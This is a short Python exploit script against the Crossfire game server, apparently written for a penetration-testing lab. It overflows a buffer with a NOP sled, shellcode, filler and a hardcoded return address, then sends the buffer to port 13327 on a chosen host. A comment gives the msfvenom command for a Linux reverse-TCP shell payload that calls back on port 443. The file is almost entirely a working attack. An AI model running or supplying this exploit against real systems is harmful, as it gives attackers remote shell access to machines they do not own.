#!/usr/bin/python3
#
# Crossfire buffer overflow
# To generate payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=$(hostname -I | awk '{print $2}') LPORT=443 -b "\x00\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2c" -f py -v shellcode -o crossfire_payload.py

import socket
import argparse
import time
from crossfire_payload import shellcode

# Script arguments
parser = argparse.ArgumentParser(description='Crossfire buffer overflow')
parser.add_argument('host', help='host to target')
args = parser.parse_args()

if type(shellcode) == bytes:
    shellcode = shellcode.decode('latin-1')

nops = "\x90" * 20
filler = 'A' * (4368 - len(shellcode) - len(nops))
eip = '\x96\x45\x13\x08'
redirect = "\x83\xc0\x0c\xff\xe0\x90\x90" 
buffer = "\x11(setup sound " + nops + shellcode + filler + eip + redirect + "\x90\x00#"
buffer = buffer.encode('latin-1')
print(f"length of buffer is {len(buffer)}, it should be 4396")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.host, 13327))
time.sleep(1)
print(s.recv(1024))
s.send(buffer)
s.close()
